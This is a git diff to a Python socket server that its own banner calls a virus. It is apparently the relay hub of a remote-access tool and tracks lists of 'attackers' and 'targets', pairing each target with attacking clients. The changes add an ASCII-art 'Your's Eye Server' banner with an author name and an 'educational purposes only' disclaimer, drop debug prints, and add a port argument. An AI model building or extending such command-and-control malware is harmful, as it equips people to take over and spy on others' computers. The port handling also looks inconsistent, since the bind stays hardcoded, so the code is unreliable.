@@ -1,6 +1,7 @@
 import socket
 import threading
 import struct
+import sys
 
 ATTACKER_LIST = []
 TARGET_LIST = []
@@ -14,7 +15,8 @@ class Server():
         self.server_socket = socket.socket()
         self.server_socket.bind(("0.0.0.0", 8000))
         self.server_socket.listen(100)
-        print("Listening for clients...")
+        self.printing_opening()
+        print("Listening for clients...\n")
 
         while True:
             client, address = self.server_socket.accept()
@@ -25,6 +27,39 @@ class Server():
         self.client = client
         Recognition(self.client).recognition()
 
+    def printing_opening(self):
+        print("""\
+
+
+                                        @@@ -=
+                    +@@@@@@@@#.         @@@@@@
+               #@@@@@@@@%%%@@@@@@@@     =@@@@
+            @@@@#.              .#@@@%    +.          |
+          @@@=                     .@@@+              |         ░█░█░█▀█░█▀▄░▀█▀░█▀▀░█░█░▀░█▀▀░░░░░█▀▀░█░█░█▀▀
+        @@@                          -@@@             |         ░░█░░█░█░█▀▄░░█░░█░░░█▀▄░░░▀▀█░░░░░█▀▀░░█░░█▀▀
+      -@@-                            .@@%            |         ░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░░░▀▀▀░▀▀▀░▀▀▀░░▀░░▀▀▀
+     =@@.                              *@@            |
+     @@:                                @@+           |
+    %@@                                 @@*           |         ░█▀▀░█▀▀░█▀▄░█░█░█▀▀░█▀▄
+    @@#           @@@.                 =@@.           |         ░▀▀█░█▀▀░█▀▄░▀▄▀░█▀▀░█▀▄
+    @@#            =@@@       -@@      @@@            |         ░▀▀▀░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀
+    *@@              @@@      @@@-    @@@.            |
+     @@#         @@@@@@@      @@@   .@@@:             |
+      @@@                 +:  @@@  .@@@.              |
+       @@@-             .@@@# +@    .@@@@@            |         
+         @@@*            *=             @@@           |         Author: Mr.Dimitrescu
+           @@@.                  @@      @@@          |         
+          %@@-     @@@     %@    @@@:    @@@          |
+          @@@    @@@@.    #@@.   .@@@@@@@@@           |         This virus was created for EDUCATIONAL PURPOSES ONLY!
+          *@@@@@@@@+      @@@    @@@ .+=              |
+            :@@*:@@=     :@@@@  @@@:
+                 -@@@@@@@@@@@@@@@@
+                    @@@@+
+
+
+
+------------------------------------------------------------------------------------------------------------------------
+    """)
 
 
 class Recognition():
@@ -42,7 +77,6 @@ class Recognition():
                 TARGET_NAMES_LIST.append(target_name)
                 TARGET_TO_ATTACKETS[self.client] = []
                 
-            print("closed attacker")
             print("TARGETS:")
             print(TARGET_LIST)
             print("TARGET NAMES:")
@@ -82,7 +116,6 @@ class Recognition():
                 except:
                     pass
                 
-            print("closed attacker")
             print("TARGETS:")
             print(TARGET_LIST)
             print("TARGET NAMES:")
@@ -170,4 +203,10 @@ class SuperSocket():
 
 
 if __name__ == '__main__':
-    Server()
+    try:
+        if len(sys.argv) == 2:
+            if int(sys.argv[1]) <= 65535 and int(sys.argv[1]) >= 1000:
+                Server(int(sys.argv[1]))
+        raise ValueError
+    except (ValueError, TypeError):
+        Server(2000)
